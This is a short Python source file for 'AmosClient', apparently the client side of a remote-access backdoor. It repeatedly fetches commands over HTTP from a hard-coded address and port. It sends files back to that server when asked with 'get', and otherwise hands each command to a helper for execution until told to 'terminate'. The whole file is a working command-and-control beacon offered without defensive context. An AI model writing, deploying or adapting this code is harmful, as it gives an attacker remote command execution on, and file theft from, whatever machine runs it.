from urllib import request, parse
from ServerHandler import ServerHandler
import subprocess
import time
import os


class AmosClient:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server_handler = ServerHandler(ip, port)


    def start(self):
        while True:
            command = request.urlopen(f"http://{self.ip}:{self.port}").read().decode()
            print(command)

            if 'terminate' in command:
                break

            # Send file
            if 'get' in command:
                self.server_handler.send_file(command)
                continue

            self.server_handler.run_command(command)
            time.sleep(1)


client = AmosClient("192.168.1.192", 8080)
client.start()



